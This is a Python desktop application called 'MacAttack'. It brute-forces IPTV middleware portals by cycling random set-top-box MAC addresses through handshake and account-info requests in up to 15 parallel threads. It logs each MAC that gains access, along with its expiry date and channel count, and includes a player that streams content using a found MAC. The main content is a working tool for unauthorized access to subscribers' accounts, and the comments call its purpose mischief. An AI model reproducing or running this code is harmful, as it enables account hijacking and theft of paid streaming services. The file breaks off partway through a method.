import os
import json
import random
import threading
from datetime import datetime
import sys
import vlc
import base64
from PyQt5.QtCore import QByteArray, QBuffer, Qt, QThread, pyqtSignal, QPropertyAnimation, QEasingCurve, QTimer
from PyQt5.QtGui import QPixmap, QIcon, QStandardItemModel, QStandardItem
from PyQt5.QtWidgets import QMainWindow, QApplication, QVBoxLayout, QLineEdit, QLabel, QPushButton, QWidget, QTabWidget, QMessageBox, QListView, QHBoxLayout, QAbstractItemView, QProgressBar, QSpinBox, QTextEdit, QSpacerItem, QSizePolicy
import requests
import logging
from urllib.parse import quote, urlparse, urlunparse
import configparser


#logging.basicConfig(level=logging.DEBUG)  # Set to DEBUG for detailed logs


def get_token(session, url, mac_address):
    try:
        handshake_url = f"{url}/portal.php?type=stb&action=handshake&JsHttpRequest=1-xml"
        cookies = {"mac": mac_address, "stb_lang": "en", "timezone": "Europe/London"}
        headers = {"User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C)"}
        response = session.get(handshake_url, cookies=cookies, headers=headers, timeout=10)
        response.raise_for_status()
        token = response.json().get("js", {}).get("token")
        if token:
            logging.debug(f"Token retrieved: {token}")
            return token
        else:
            logging.error("Token not found in handshake response.")
            return None
    except Exception as e:
        logging.error(f"Error getting token: {e}")

        return None

class RequestThread(QThread):
    request_complete = pyqtSignal(dict)  # Signal to emit when request is complete
    update_progress = pyqtSignal(int)  # Signal to emit progress updates
    channels_loaded = pyqtSignal(list)  # Signal to emit channels when loaded
    
    def __init__(self, base_url, mac_address, category_type=None, category_id=None):
        super().__init__()
        self.base_url = base_url
        self.mac_address = mac_address
        self.category_type = category_type
        self.category_id = category_id

    def run(self):
        try:
            # Check if thread was interrupted at the start
            if self.isInterruptionRequested():
                logging.debug("RequestThread was interrupted at the start.")
                self.request_complete.emit({})
                return

            logging.debug("RequestThread started.")
            session = requests.Session()
            token = self.get_token(session, self.base_url, self.mac_address)

            if self.isInterruptionRequested():
                logging.debug("RequestThread was interrupted after token retrieval.")
                self.request_complete.emit({})
                return

            if token:
                if self.category_type and self.category_id:
                    self.update_progress.emit(10)  # Token retrieval complete
                    channels = self.get_channels(session, self.base_url, self.mac_address, token, self.category_type, self.category_id)
                    
                    if self.isInterruptionRequested():
                        logging.debug("RequestThread was interrupted while fetching channels.")
                        self.request_complete.emit({})
                        return
                    
                    self.update_progress.emit(100)
                    self.channels_loaded.emit(channels)
                else:
                    self.fetch_and_emit_playlist_data(session, token)
            else:
                self.request_complete.emit({})  # Emit empty data if token fails
                self.update_progress.emit(0)

        except Exception as e:
            logging.error(f"Error in thread: {e}")
        finally:
            logging.debug("Thread cleanup complete.")
            
    def requestInterruption(self):
        # This is how you request interruption in QThread.
        super().requestInterruption()

    def fetch_and_emit_playlist_data(self, session, token):
        # Simulating the playlist fetching process
        data = {"Live": [], "Movies": [], "Series": []}

        # Fetching genres for Live tab
        self.update_progress.emit(10)
        genres = self.get_genres(session, self.base_url, self.mac_address, token)
        if genres:
            data["Live"].extend(genres)
        else:
            self.update_progress.emit(0)
            return

        # Update progress after fetching genres
        self.update_progress.emit(40)

        # Fetching VOD categories for Movies tab
        vod_categories = self.get_vod_categories(session, self.base_url, self.mac_address, token)
        if vod_categories:
            data["Movies"].extend(vod_categories)

        # Update progress after fetching VOD categories
        self.update_progress.emit(70)

        # Fetching Series categories for Series tab
        series_categories = self.get_series_categories(session, self.base_url, self.mac_address, token)
        if series_categories:
            data["Series"].extend(series_categories)

        # Final progress update
        self.update_progress.emit(100)
        # Emit the complete data through the signal
        self.request_complete.emit(data)

    def get_token(self, session, url, mac_address):
        try:
            handshake_url = f"{url}/portal.php?type=stb&action=handshake&JsHttpRequest=1-xml"
            cookies = {"mac": mac_address, "stb_lang": "en", "timezone": "Europe/London"}
            headers = {"User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C)"}
            response = session.get(handshake_url, cookies=cookies, headers=headers, timeout=10)
            response.raise_for_status()
            token = response.json().get("js", {}).get("token")
            if token:
                logging.debug(f"Token retrieved: {token}")
                return token
            else:
                logging.error("Token not found in handshake response.")
                return None
        except Exception as e:
            logging.error(f"Error getting token: {e}")

            return None

    def get_genres(self, session, url, mac_address, token):
        try:
            genres_url = f"{url}/portal.php?type=itv&action=get_genres&JsHttpRequest=1-xml"
            cookies = {"mac": mac_address, "stb_lang": "en", "timezone": "Europe/London"}
            headers = {
                "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C)",
                "Authorization": "Bearer " + token,
            }
            response = session.get(genres_url, cookies=cookies, headers=headers, timeout=10)
            response.raise_for_status()
            genre_data = response.json().get("js", [])
            if genre_data:
                genres = [
                    {
                        "name": i["title"],
                        "category_type": "IPTV",
                        "category_id": i["id"],
                    }
                    for i in genre_data
                ]
                logging.debug(f"Genres fetched: {genres}")
                return genres
            else:
                logging.warning("No genres data found.")
                self.request_complete.emit({})  # Emit empty data if token fails
                return []
        except Exception as e:
            logging.error(f"Error getting genres: {e}")
            return []

    def get_vod_categories(self, session, url, mac_address, token):
        try:
            vod_url = f"{url}/portal.php?type=vod&action=get_categories&JsHttpRequest=1-xml"
            cookies = {"mac": mac_address, "stb_lang": "en", "timezone": "Europe/London"}
            headers = {
                "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C)",
                "Authorization": "Bearer " + token,
            }
            response = session.get(vod_url, cookies=cookies, headers=headers, timeout=10)
            response.raise_for_status()
            categories_data = response.json().get("js", [])
            if categories_data:
                categories = [
                    {
                        "name": category["title"],
                        "category_type": "VOD",
                        "category_id": category["id"],
                    }
                    for category in categories_data
                ]
                logging.debug(f"VOD categories fetched: {categories}")
                return categories
            else:
                logging.warning("No VOD categories data found.")
                return []
        except Exception as e:
            logging.error(f"Error getting VOD categories: {e}")
            return []

    def get_series_categories(self, session, url, mac_address, token):
        try:
            series_url = f"{url}/portal.php?type=series&action=get_categories&JsHttpRequest=1-xml"
            cookies = {"mac": mac_address, "stb_lang": "en", "timezone": "Europe/London"}
            headers = {
                "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C)",
                "Authorization": "Bearer " + token,
            }
            response = session.get(series_url, cookies=cookies, headers=headers, timeout=10)
            response.raise_for_status()
            response_json = response.json()
            logging.debug(f"Series categories response: {response_json}")
            if not isinstance(response_json, dict) or "js" not in response_json:
                logging.error("Unexpected response structure for series categories.")
                return []

            categories_data = response_json.get("js", [])
            categories = [
                {
                    "name": category["title"],
                    "category_type": "Series",
                    "category_id": category["id"],
                }
                for category in categories_data
            ]
            logging.debug(f"Series categories fetched: {categories}")
            return categories
        except Exception as e:
            logging.error(f"Error getting series categories: {e}")
            return []

    def get_channels(
        self, session, url, mac_address, token, category_type, category_id
    ):
        try:
            channels = []
            cookies = {"mac": mac_address, "stb_lang": "en", "timezone": "Europe/London"}
            headers = {
                "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C)",
                "Authorization": f"Bearer {token}",
            }
            page_number = 0
            while True:
                page_number += 1
                if category_type == "IPTV":
                    channels_url = f"{url}/portal.php?type=itv&action=get_ordered_list&genre={category_id}&JsHttpRequest=1-xml&p={page_number}"
                elif category_type == "VOD":
                    channels_url = f"{url}/portal.php?type=vod&action=get_ordered_list&category={category_id}&JsHttpRequest=1-xml&p={page_number}"
                elif category_type == "Series":
                    channels_url = f"{url}/portal.php?type=series&action=get_ordered_list&category={category_id}&p={page_number}&JsHttpRequest=1-xml"
                else:
                    logging.error(f"Unknown category_type: {category_type}")
                    break

                logging.debug(f"Fetching channels from URL: {channels_url}")
                response = session.get(
                    channels_url, cookies=cookies, headers=headers, timeout=10
                )
                if response.status_code == 200:
                    channels_data = response.json().get("js", {}).get("data", [])
                    if not channels_data:
                        logging.debug("No more channels data found.")
                        break
                    for channel in channels_data:
                        channel["item_type"] = (
                            "series"
                            if category_type == "Series"
                            else "vod"
                            if category_type == "VOD"
                            else "channel"
                        )
                    channels.extend(channels_data)
                    total_items = response.json().get("js", {}).get("total_items", len(channels))
                    logging.debug(f"Fetched {len(channels)} channels out of {total_items}.")
                    if len(channels) >= total_items:
                        logging.debug("All channels fetched.")
                        break
                else:
                    logging.error(
                        f"Request failed for page {page_number} with status code {response.status_code}"
                    )
                    break
            logging.debug(f"Total channels fetched: {len(channels)}")
            return channels
        except Exception as e:
            logging.error(f"An error occurred while retrieving channels: {str(e)}")
            return []

class MacAttack(QMainWindow):
    update_mac_label_signal = pyqtSignal(str)
    update_output_text_signal = pyqtSignal(str)
    update_error_text_signal = pyqtSignal(str)
    
    def __init__(self):
        super().__init__()
        self.current_request_thread = None  # This ensures the attribute exists
        self.set_window_icon()
        self.setWindowTitle("MacAttack by Evilvirus")
        self.setGeometry(200, 200, 600, 500)

        self.running = False
        self.threads = []
        self.output_file = None
        
        # Set the Fusion theme with dark mode
        QApplication.setStyle("Fusion")

# Set dark style for the whole application
        dark_stylesheet = """
        QWidget {
            background-color: #2e2e2e;
            color: white;
            font-size: 10pt;
        }

        QLineEdit, QPushButton, QTabWidget, QProgressBar {
            background-color: #444444;
            color: white;
            border: 1px solid #666666;
            padding: 5px;
            border-radius: 3px;  /* Optional: rounded corners for a modern look */
        }

        QLineEdit:focus, QPushButton:pressed {
            background-color: #666666;
        }

        QTabWidget::pane {
            border: 0px solid #000000;
            background-color: #333333;
        }

        QTabBar::tab {
            background-color: #444444;
            color: white;
            padding: 5px;
            border-radius: 3px;  /* Optional: rounded corners for tab buttons */
        }

        QTabBar::tab:selected {
            background-color: #666666;
        }

        QProgressBar {
            text-align: center;
            color: white;
            border-radius: 5px;
            background-color: #555555;
        }

        QProgressBar::chunk {
            background-color: #1e90ff;  /* Blue chunk */
        }
        """
        self.setStyleSheet(dark_stylesheet)

        # Main layout
        self.central_widget = QWidget(self)
        self.setCentralWidget(self.central_widget)
        self.main_layout = QVBoxLayout(self.central_widget)
        self.main_layout.setContentsMargins(0, 0, 0, 0)
        self.main_layout.setSpacing(0)  

        # Create the tabs (Top-level tabs)
        self.tabs = QTabWidget(self)  # This is for the "Mac Attack" and "Mac VideoPlayer" tabs
        self.main_layout.addWidget(self.tabs)
        
        # Create the tabs content
        self.mac_attack_frame = QWidget()
        self.build_mac_attack_gui(self.mac_attack_frame)
        self.tabs.addTab(self.mac_attack_frame, "Mac Attack")

        self.mac_videoPlayer_frame = QWidget()
        self.build_mac_videoPlayer_gui(self.mac_videoPlayer_frame)
        self.tabs.addTab(self.mac_videoPlayer_frame, "Mac VideoPlayer")
        self.load_settings()
        # Connect the signals to their respective update methods
        self.update_mac_label_signal.connect(self.update_mac_label)
        self.update_output_text_signal.connect(self.update_output_text)
        self.update_error_text_signal.connect(self.update_error_text)
        
    def update_mac_label(self, text):
        """Update the MAC address label in the main thread."""
        self.brute_mac_label.setText(text)

    def update_output_text(self, text):
        """Update the QTextEdit widget in the main thread."""
        self.output_text.append(text)  

    def update_error_text(self, text):
        """Update the QTextEdit widget in the main thread."""
        self.error_text.append(text)  
        
    def build_mac_attack_gui(self, parent):
        layout = QVBoxLayout(parent)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)  

        # Combined layout for IPTV link, Speed, and Start/Stop buttons
        combined_layout = QHBoxLayout()
        combined_layout.setContentsMargins(0, 0, 0, 0)
        combined_layout.setSpacing(10)

        # Add spacer to the left of IPTV link label
        left_spacer = QSpacerItem(10, 0, QSizePolicy.Fixed, QSizePolicy.Minimum)
        combined_layout.addItem(left_spacer)
        layout.addSpacing(15)  # Adds space
        # IPTV link input
        self.iptv_link_label = QLabel("IPTV link:")
        self.iptv_link_entry = QLineEdit("http://evilvir.us.streamtv.to:8080/c/")
        combined_layout.addWidget(self.iptv_link_label)
        combined_layout.addWidget(self.iptv_link_entry)

        # Speed input (SpinBox)
        self.speed_label = QLabel("Speed:")
        self.concurrent_tests = QSpinBox()
        self.concurrent_tests.setRange(1, 15)
        self.concurrent_tests.setValue(10)
        combined_layout.addWidget(self.speed_label)
        combined_layout.addWidget(self.concurrent_tests)

        # Start/Stop buttons
        self.start_button = QPushButton("Start")
        self.start_button.clicked.connect(self.TestDrive)
        self.stop_button = QPushButton("Stop")
        #self.stop_button.setEnabled(False)
        self.stop_button.clicked.connect(self.GiveUp)
        combined_layout.addWidget(self.start_button)
        combined_layout.addWidget(self.stop_button)

        # Add spacer to the right of the Stop button
        right_spacer = QSpacerItem(10, 0, QSizePolicy.Fixed, QSizePolicy.Minimum)
        combined_layout.addItem(right_spacer)

        # Add the combined layout to the main layout
        layout.addLayout(combined_layout)
        layout.addSpacing(15)  # Adds space
        
        # MAC address label
        self.brute_mac_label = QLabel("Testing MAC address will appear here.")
        layout.addWidget(self.brute_mac_label, alignment=Qt.AlignCenter)  # Center the label
        layout.addSpacing(15)  # Adds space

        # Output Text Area
        self.output_text = QTextEdit()
        self.output_text.setStyleSheet("""
            color: white;
            background-color: #10273d;
            border: 12px solid #2E2E2E;
        """)
        self.output_text.setPlainText("Output LOG:\nResults will appear here.\n\n")
        self.output_text.setReadOnly(True)
        layout.addWidget(self.output_text)

        # Error Log Area
        self.error_text = QTextEdit()
        self.error_text.setStyleSheet("""
            color: grey;
            background-color: #451e1c;
            border-top: 0px;
            border-left: 12px solid #2E2E2E;
            border-right: 12px solid #2E2E2E;
            border-bottom: 0px;
        """)
        self.error_text.setPlainText("Error LOG:\nIt's normal for a few errors to appear down here.\nwhen speed is set high\nIf errors are getting spammed, lower the speed.")
        self.error_text.setReadOnly(True)
        layout.addWidget(self.error_text)
        layout.addSpacing(15)  # Adds space

    def build_mac_videoPlayer_gui(self, parent):
        # Central widget for the "Mac VideoPlayer" tab
        central_widget = QWidget(self)
        parent.setLayout(QVBoxLayout())  # Set layout for the parent widget
        parent.layout().setContentsMargins(0, 0, 0, 0)
        parent.layout().setSpacing(0)
        parent.layout().addWidget(central_widget)

        # Initialize VLC instance
        self.instance = vlc.Instance('--no-xlib', '--vout=directx')  # Windows
        self.videoPlayer = self.instance.media_player_new()

        # Main layout to hold both left content and VLC frame
        main_layout = QHBoxLayout(central_widget)
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(0)  

        # Left layout for all other widgets
        self.left_layout = QVBoxLayout()  # Define left_layout as an instance variable
        self.left_layout.setContentsMargins(0, 0, 0, 0)
        self.left_layout.setSpacing(0)  

        # Hostname label and input horizontally aligned
        self.hostname_layout = QHBoxLayout()  # Create a horizontal layout
        self.hostname_layout.setContentsMargins(0, 0, 0, 0)
        self.hostname_layout.setSpacing(0)
        self.hostname_label = QLabel("Host:")
        self.hostname_layout.addWidget(self.hostname_label)
        self.hostname_input = QLineEdit()
        self.hostname_layout.addWidget(self.hostname_input)
        self.left_layout.addLayout(self.hostname_layout)

        # MAC label and input horizontally aligned
        self.mac_layout = QHBoxLayout()
        self.mac_layout.setContentsMargins(0, 0, 0, 0)
        self.mac_layout.setSpacing(0)
        self.mac_label = QLabel("MAC:")
        self.mac_layout.addWidget(self.mac_label)
        self.mac_input = QLineEdit()
        self.mac_layout.addWidget(self.mac_input)
        self.left_layout.addLayout(self.mac_layout)

        self.get_playlist_button = QPushButton("Get Playlist")
        self.left_layout.addWidget(self.get_playlist_button)
        self.get_playlist_button.clicked.connect(self.get_playlist)

        # Create a QTabWidget (for "Live", "Movies", "Series")
        self.tab_widget = QTabWidget()
        self.left_layout.addWidget(self.tab_widget)

        # Dictionary to hold tab data
        self.tab_data = {}

        for tab_name in ["Live", "Movies", "Series"]:
            tab = QWidget()
            tab_layout = QVBoxLayout(tab)
            tab_layout.setContentsMargins(0, 0, 0, 0)
            tab_layout.setSpacing(0)
            playlist_view = QListView()
            playlist_view.setEditTriggers(QAbstractItemView.NoEditTriggers)
            tab_layout.addWidget(playlist_view)

            self.playlist_model = QStandardItemModel(playlist_view)
            playlist_view.setModel(self.playlist_model)

            playlist_view.doubleClicked.connect(self.on_playlist_selection_changed)
            self.tab_widget.addTab(tab, tab_name)

            self.tab_data[tab_name] = {
                "tab_widget": tab,
                "playlist_view": playlist_view,
                "self.playlist_model": self.playlist_model,
                "current_category": None,
                "navigation_stack": [],
                "playlist_data": [],
                "current_channels": [],
                "current_series_info": [],
                "current_view": "categories",
            }

        # Progress bar at the bottom
        self.progress_bar = QProgressBar()
        self.progress_bar.setStyleSheet(
            """
            QProgressBar {
                text-align: center;
                color: white;
            }
            QProgressBar::chunk {
                background-color: blue;
            }
            """
        )
        self.progress_bar.setValue(0)
        self.left_layout.addWidget(self.progress_bar)

        # Create "ERROR" label and hide it initially
        self.error_label = QLabel("ERROR: Error message label")
        self.error_label.setStyleSheet("color: red; font-size: 10pt;")
        self.left_layout.addWidget(self.error_label, alignment=Qt.AlignRight)
        self.error_label.hide()  # Initially hide the label

        # Add the left layout to the main layout
        main_layout.addLayout(self.left_layout)

        # Right frame for VLC media window
        self.video_frame = QWidget(self)  # Changed from QFrame to QWidget for direct size management
        self.video_frame.setStyleSheet("background-color: black;")  # Ensure black background for video area

        # VLC dynamic width
        new_width = self.width() - 360
        self.video_frame.setMinimumWidth(new_width)

        main_layout.addWidget(self.video_frame)

        if sys.platform.startswith('linux'):  # for Linux using the X Server
            self.videoPlayer.set_xwindow(self.video_frame.winId())
        elif sys.platform == "win32":  # for Windows
            self.videoPlayer.set_hwnd(self.video_frame.winId())
        elif sys.platform == "darwin":  # for MacOS
            self.videoPlayer.set_nsobject(int(self.video_frame.winId()))

        self.videoPlayer.set_media(self.instance.media_new('https://iptv.evilvir.us/skull4K.mp4'))  # Load skull
        self.videoPlayer.play()  # Start playing the video

        self.videoPlayer.video_set_mouse_input(False)
        self.videoPlayer.video_set_key_input(False)

        # Create and initialize the progress animation
        self.progress_animation = QPropertyAnimation(self.progress_bar, b"value")
        self.progress_animation.setDuration(1000)  # Duration of the animation (in milliseconds)
        self.progress_animation.setEasingCurve(QEasingCurve.Linear)  # Smooth progress change
           
    def save_settings(self):
        """Save user settings, including window geometry, to the configuration file."""
        import os
        import configparser
        
        user_dir = os.path.expanduser('~')
        os.makedirs(os.path.join(user_dir, 'evilvir.us'), exist_ok=True)
        file_path = os.path.join(user_dir, 'evilvir.us', 'MacAttack.ini')
        
        config = configparser.ConfigParser()
        config['Settings'] = {
            'iptv_link': self.iptv_link_entry.text(),
            'concurrent_tests': self.concurrent_tests.value(),
            'hostname': self.hostname_input.text(),
            'mac': self.mac_input.text()
        }
        
        config['Window'] = {
            'width': self.width(),
            'height': self.height(),
            'x': self.x(),
            'y': self.y()
        }
        
        with open(file_path, 'w') as configfile:
            config.write(configfile)
        print("Settings saved.")   
        
    def load_settings(self):
        """Load user settings from the configuration file and apply them to the UI elements and window geometry."""
        import os
        import configparser
        
        user_dir = os.path.expanduser('~')
        file_path = os.path.join(user_dir, 'evilvir.us', 'MacAttack.ini')
        
        config = configparser.ConfigParser()
        if os.path.exists(file_path):
            config.read(file_path)
            
            # Load UI settings
            self.iptv_link_entry.setText(config.get('Settings', 'iptv_link', fallback="http://evilvir.us.streamtv.to:8080/c/"))
            self.concurrent_tests.setValue(config.getint('Settings', 'concurrent_tests', fallback=10))
            self.hostname_input.setText(config.get('Settings', 'hostname', fallback=""))
            self.mac_input.setText(config.get('Settings', 'mac', fallback=""))
            
            # Load window geometry settings
            if config.has_section('Window'):
                self.resize(config.getint('Window', 'width', fallback=800), 
                            config.getint('Window', 'height', fallback=600))
                self.move(config.getint('Window', 'x', fallback=200), 
                          config.getint('Window', 'y', fallback=200))
            print("Settings loaded.")
        else:
            print("No settings file found.") 
        
    def set_window_icon(self):
        # Base64 encoded image string (replace with your own base64 string)
        base64_image_data = "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAIGNIUk0AAHomAACAhAAA+gAAAIDoAAB1MAAA6mAAADqYAAAXcJy6UTwAAAFEUExURQAAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAAP////swTbIAAABqdFJOUwAAAQ5foub6786BRAgPZuL4/vHRTwp46nHJ/MP3/bjkVk2j7d+JSW7ytG2yBwQ4pSEDG8UrtXNZoaunilqPkxI3zO7ne4Lo84xQ0/DenBoiXX+/qFg8XHypl2HHvL3EwkJDuewcM9iGEAL/x//9AAAAAWJLR0RrUmWlmAAAAAd0SU1FB+gLAxY0DY6W/TgAAADISURBVBjTY2BgYGJmYWVj5+Dk4uZhZAABXj5+gaysLEEhYRFRsICYeBYUsEmABSSlYAJS0mAB9iw4kAELcGTJyoLMkJLNEgALyMkrKCopq6iqqWtoggW0tHV09ST1DQyNjEXAAiamZuYWllbWNrZ29mABB0cnZxUXVxU3dw9esICnl5uMgJMTu7ePrx9YwD8gMEhAVkojOCQU4lJGxrDwCCttu0g9BihgjIqOiZWLi0+ACyQmeUvJJpulwAQYmFMDhdPSMzJBbABSPiiLTyeG8AAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAyNC0xMS0wM1QyMjo1MjoxMiswMDowMGTV5jAAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMjQtMTEtMDNUMjI6NTI6MTIrMDA6MDAViF6MAAAAKHRFWHRkYXRlOnRpbWVzdGFtcAAyMDI0LTExLTAzVDIyOjUyOjEzKzAwOjAw5Op05wAAAABJRU5ErkJggg=="

        # Decode the base64 string
        image_data = base64.b64decode(base64_image_data)

        # Create a QPixmap from the decoded data
        pixmap = QPixmap()
        byte_array = QByteArray(image_data)
        buffer = QBuffer(byte_array)
        buffer.open(QBuffer.ReadOnly)
        pixmap.loadFromData(buffer.data())

        # Set the QIcon using the pixmap
        self.setWindowIcon(QIcon(pixmap))    

    def TestDrive(self):
        # The "Let's hit the gas and see what happens" function
        self.running = True
        #self.start_button.setDisabled(True)
        #self.start_button.setDisabled(False)

        self.iptv_link = self.iptv_link_entry.text()
        self.parsed_url = urlparse(self.iptv_link)
        self.host = self.parsed_url.hostname
        self.port = self.parsed_url.port or 80
        self.base_url = f"http://{self.host}:{self.port}"

        num_tests = self.concurrent_tests.value()
        # Limit to a maximum of 10 concurrent tests, 'cause we’re not running a circus here.
        if num_tests > 15:
            num_tests = 15

        # Save current settings to a file so they don’t get lost forever
        self.SaveTheDay()

        # Start threads to test MACs
        for _ in range(num_tests):
            thread = threading.Thread(target=self.BigMacAttack)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
        self.save_settings()
            
    def RandomMacGenerator(self, prefix="00:1A:79:"):
        # Create random MACs. Purely for mischief. Don't tell anyone.
        return f"{prefix}{random.randint(0, 255):02X}:{random.randint(0, 255):02X}:{random.randint(0, 255):02X}"
            
    def BigMacAttack(self):
        # BigMacAttack: Two all-beef patties, special sauce, lettuce, cheese, pickles, onions, on a sesame seed bun.
        while self.running:  # Loop will continue as long as self.running is True
            mac = self.RandomMacGenerator()  # Generate a random MAC
            self.update_mac_label_signal.emit(f"Testing MAC: {mac}")

            try:
                s = requests.Session()  # Create a session
                s.cookies.update({'mac': mac})
                url = f"{self.base_url}/portal.php?action=handshake&type=stb&token=&JsHttpRequest=1-xml"

                res = s.get(url, timeout=10, allow_redirects=False)
                if res.text:
                    data = json.loads(res.text)
                    tok = data.get('js', {}).get('token')  # Safely access token to prevent KeyError

                    url2 = f"{self.base_url}/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
                    headers = {"Authorization": f"Bearer {tok}"}
                    res2 = s.get(url2, headers=headers, timeout=10, allow_redirects=False)

                    if res2.text:
                        data = json.loads(res2.text)
                        # Ensure required keys exist before accessing
                        if 'js' in data and 'mac' in data['js'] and 'phone' in data['js']:  
                            mac = data['js']['mac']
                            expiry = data['js']['phone']

                            url3 = f"{self.base_url}/portal.php?type=itv&action=get_all_channels&JsHttpRequest=1-xml"
                            res3 = s.get(url3, headers=headers, timeout=10, allow_redirects=False)

                            count = 0
                            if res3.status_code == 200:
                                # Updated handling with type checks to avoid unexpected TypeErrors
                                try:
                                    response_data = json.loads(res3.text)
                                    if isinstance(response_data, dict) and "js" in response_data and "data" in response_data["js"]:
                                        channels_data = response_data["js"]["data"]
                                        count = len(channels_data)  # Count channels if data is valid
                                    else:
                                        self.update_error_text_signal.emit("Unexpected data structure for channels.")
                                        count = 0
                                except (TypeError, json.decoder.JSONDecodeError) as e:
                                    self.update_error_text_signal.emit(f"Data parsing error for channels data: {str(e)}")
                                    count = 0

                            if count > 0:
                                print("Mac found")
                                if self.output_file is None:
                                    output_filename = self.OutputMastermind()
                                    self.output_file = open(output_filename, "a")

                                result_message = f"{self.iptv_link}\nMAC = {mac}\nExpiry = {expiry}\nChannels = {count}\n\n"
                                self.update_output_text_signal.emit(result_message)  # Emit signal to update QTextEdit

                                # Write result_message to the output file
                                self.output_file.write(result_message)
                                self.output_file.flush()  # Optional: Ensures data is written immediately
                            else:
                                result_message = f"MAC: {mac} connects, but has 0 channels. Bummer."
                                self.update_error_text_signal.emit(result_message)
                    else:
                        self.update_error_text_signal.emit(f"No JSON response for MAC {mac}")

            # Catch all relevant exceptions and ensure the loop continues
            except (json.decoder.JSONDecodeError, requests.exceptions.RequestException, TypeError) as e:
                if "Expecting value: line 1 column 1 (char 0)" in str(e):
                    self.update_error_text_signal.emit(
                        f"Error for MAC: {mac} : {str(e).replace('Expecting value: line 1 column 1 (char 0)', 'Empty response')}"
                    )
                else:
                    self.update_error_text_signal.emit(f"Error for MAC {mac}: {str(e)}")
                     
    def SaveTheDay(self):
        # Saving the day by storing our preferences so we can be lazy
        settings = {
            'url': self.iptv_link_entry.text(),
            'speed': self.concurrent_tests.value()
        }

        # Ensuring the sacred settings folder is there
        user_profile = os.environ['USERPROFILE']
        settings_dir = os.path.join(user_profile, "Evilvir.us")
        os.makedirs(settings_dir, exist_ok=True)
        settings_file = os.path.join(settings_dir, "iptv_checker_settings.json")

        with open(settings_file, 'w') as file:
            json.dump(settings, file)

    def OutputMastermind(self):
        # Fancy file-naming because why not complicate things?
        current_time = datetime.now().strftime("%Y%m%d_%H%M%S")
        sanitized_url = self.base_url.replace("http://", "").replace("https://", "").replace("/", "_").replace(":", "-")
        filename = f"{sanitized_url}_{current_time}.txt"
        return filename
    
    def GiveUp(self):
        
        # GiveUp: Like throwing in the towel, but with less dignity. But hey, we tried, right?
        print("GiveUp method has been called. We tried, but it's over.")  # Console printout
        self.running = False
        # self.start_button.setDisabled(False)
        # self.start_button.setDisabled(True)

        if hasattr(self, 'output_file') and self.output_file:
            self.output_file.close()
    
    def ErrorAnnouncer(self, message):
        self.error_text.append(message)
                
    def set_progress(self, value):
        # Ensure the animation only runs if it's not already running
        if self.progress_animation.state() != QPropertyAnimation.Running:
            self.progress_animation.setStartValue(self.progress_bar.value())
            self.progress_animation.setEndValue(value)
            self.progress_animation.start()
            
    def stop_request_thread(self):
        if self.current_request_thread is not None:
            self.current_request_thread.requestInterruption()
            logging.debug("RequestThread interruption requested.")

    def get_playlist(self):
        self.error_label.hide()  # Hide the error label
        self.playlist_model.clear()
        hostname_input = self.hostname_input.text()
        mac_address = self.mac_input.text()

        if not hostname_input or not mac_address:
            self.error_label.setText("ERROR: Unable to connect to the host")
            self.error_label.show()
            logging.warning(
                "User attempted to get playlist without entering all required fields."
            )
            return

        parsed_url = urlparse(hostname_input)
        if not parsed_url.scheme and not parsed_url.netloc:
            parsed_url = urlparse(f"http://{hostname_input}")
        elif not parsed_url.scheme:
            parsed_url = parsed_url._replace(scheme="http")

        self.base_url = urlunparse((parsed_url.scheme, parsed_url.netloc, "", "", "", ""))
        self.mac_address = mac_address

        # Stop the current request thread if one is already running
        
        if self.current_request_thread is not None and self.current_request_thread.isRunning():
            logging.info("Stopping current RequestThread to start a new one.")
            self.current_request_thread.wait()  # Wait for the thread to finish

        # Initialize a new RequestThread for fetching playlist
        self.request_thread = RequestThread(self.base_url, mac_address)
        self.request_thread.request_complete.connect(self.on_initial_playlist_received)
        self.request_thread.update_progress.connect(self.set_progress)
        self.request_thread.start()
        self.current_request_thread = self.request_thread
        logging.info("Started new RequestThread for playlist.")
        
    def set_progress(self, value):
        # Animate the progress bar to the new value
        if self.progress_animation.state() == QPropertyAnimation.Running:
            self.progress_animation.stop()
        start_val = self.progress_bar.value()
        self.progress_animation.setStartValue(start_val)
        self.progress_animation.setEndValue(value)
        self.progress_animation.start()
        logging.debug(f"Animating progress bar from {start_val} to {value}.")

    def on_initial_playlist_received(self, data):
        if self.current_request_thread != self.sender():
            logging.info("Received data from an old thread. Ignoring.")
            return  # Ignore signals from older threads

        if not data:
            self.stop_request_thread()
            self.error_label.setText("ERROR: Unable to connect to the host")
            self.error_label.show()
            logging.info("Playlist data is empty.")
            self.current_request_thread = None
            return

        for tab_name, tab_data in data.items():
            # Change this line to use self.tab_data instead of self.tabs
            tab_info = self.tab_data.get(tab_name)  # Use the dictionary with tab data
            if not tab_info:
                logging.info(f"Unknown tab name: {tab_name}")
                continue

            tab_info["playlist_data"] = tab_data
            tab_info["current_category"] = None
            tab_info["navigation_stack"] = []
            self.update_playlist_view(tab_name)

        logging.debug("Playlist data loaded into tabs.")
        self.current_request_thread = None  # Reset the current thread

    def update_playlist_view(self, tab_name):
        tab_info = self.tab_data[tab_name]
        self.playlist_model = tab_info["self.playlist_model"]
        self.playlist_model.clear()
        tab_info["current_view"] = "categories"

        if tab_info["navigation_stack"]:
